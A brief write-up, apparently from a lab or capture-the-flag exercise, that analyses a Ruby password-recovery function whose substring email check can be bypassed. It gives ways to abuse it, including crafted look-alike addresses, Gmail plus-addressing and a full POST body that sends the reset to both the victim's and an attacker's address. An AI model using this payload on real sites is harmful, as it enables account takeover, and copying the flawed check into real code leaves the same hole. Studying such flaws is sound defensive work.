```
def recover
    user_found = false
    User.all.each { |user|
      if params[:email].include?(user.email)
        user_found = true
        break
      end
    }
```
+ `if params[:email].include?(user.email):` This line checks if the email address provided in the request parameters (accessed via `params[:email]`) includes the email address of the current user
+ This could be bypassed through various ways. 
+ Registering an email account like `stuffinfrontb8500763@gmail.com` and then email will be sent to that account
+ the + is like a "comment" for gmails
abc+xyz@gmail sends to abc
+ 
```
authenticity_token=VC0S6413dGeby-FU16TipUXaOcojnjroifUut94Fl0FPw7eSrCTx6QbA0zCxwFQ_h3BBSf0MjuKjoXP3vk-aOA&email[]=b8500763%40gmail.com&email[]=velefin408@ekposta.com&commit=Submit
```
